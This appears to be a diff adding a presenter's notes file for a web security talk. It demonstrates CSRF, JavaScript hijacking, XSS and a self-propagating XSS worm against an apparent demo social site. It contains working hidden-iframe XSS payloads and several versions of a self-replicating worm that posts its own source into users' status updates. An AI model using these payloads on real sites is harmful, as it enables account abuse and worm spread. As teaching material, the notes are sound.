@@ -1,0 +1,83 @@
+
+Demo 1: CSRF
+------------
+Introduce BlabberOne
+	blabberone.sitepen.com
+	Show:
+		all users
+		making friends
+		sending messages
+		getting random friends
+	Ensure the audience has seen tweets
+
+Hop over to Twitter
+	Check out tweet from Dion
+	http://localhost:8080/csrf-demo/
+	CSRF to remove all tweets
+
+The point: The page that Dion linked to, used CSRF to abuse my superuser privs on blabberone to delete all the tweets
+
+
+Demo 2: JavaScript Hijack
+-------------------------
+Visit http://localhost:8080/csrf-demo/hijack.html
+	Point out that this is using CSRF to READ
+
+Demo 3: XSS
+-----------
+Change my BG to black
+
+Jeremiah: log into blabberone, and message this:
+
+Some random message<iframe style="width:0; height:0; border:0;" src="javascript:window.parent.Network.setBackground('000');"/>
+
+
+
+Demo 4: Worm
+------------
+If we get time:
+
+<iframe width=0 height=0 border=0 id="hack" src="javascript:var p=window.parent;p.Network.getCurrentUser(function(user) {if(user.background !='000'){p.Network.setBackground('000');p.document.body.style.background='#000';p.Network.updateStatus(p.document.getElementById('hack').parentNode.innerHTML);}});"/>
+
+
+<iframe width=0 height=0 border=0 id="hack" src="javascript:window.parent.Network.getCurrentUser(function(user) {if(user.background !='000'){window.parent.Network.setBackground('000'); window.parent.document.body.style.background='#000'; window.parent.Network.updateStatus(user.username + ' says hi.' + window.parent.document.getElementById('hack').parentNode.innerHTML);}});"/>
+
+
+Worm notes
+----------
+
+This is the payload:
+
+var p = window.parent;
+p.Network.getCurrentUser(function(user) {
+  if (user.background != '000') {
+    p.Network.setBackground('000');
+    p.document.body.style.background = '#000';
+    window.parent.Network.updateStatus(SOURCE);
+  }
+}
+
+This is a quine in javascript:
+
+var s="var s=X;var q=String.fromCharCode(34);console.log(s.replace(/X/,q+s+q));";var q=String.fromCharCode(34); console.log(s.replace(/X/,q+s+q));
+
+
+This is another:
+
+(function quine(){return '('+quine+')();';})();
+
+
+This is the payload applied to the first quine, however this doesn't have a way to spark the script:
+
+var s="var s=X;var q=String.fromCharCode(34);var p = window.parent;p.Network.getCurrentUser(function(user){if(user.background!='000'){p.Network.setBackground('000');p.document.body.style.background='#000';window.parent.Network.updateStatus(s.replace(/X/,q+s+q));}};";var q=String.fromCharCode(34);var p = window.parent;p.Network.getCurrentUser(function(user){if(user.background!='000'){p.Network.setBackground('000');p.document.body.style.background='#000';window.parent.Network.updateStatus(s.replace(/X/,q+s+q));}};
+
+Using script decompilation (gives syntax error):
+
+Initial random message<iframe width=0 height=0 border=0 src="javascript:(function v() { var  p = window.parent; p.Network.getCurrentUser(function (user) {if (user.background != '000') {p.Network.setBackground('000');p.document.body.style.background = '#000';var rs = new RegExp(String.fromCharCode(92) + String.fromCharCode(115)); var d = String.fromCharCode(34);var m = 'Some random message<iframe width=0 height=0 border=0 src=' + d + 'javascript:((' + v + ').replace(/\u0022/g, String.fromCharCode(39)).replace(rs, String.fromCharCode(32)) )();' + d + '/>';p.Network.updateStatus(m);}}); })();"/>
+
+XSS sources:
+
+<div onresize=""><img src="slow_img.png"></div>
+
+<iframe style="width:0; height:0; border:0" src=""/>
+
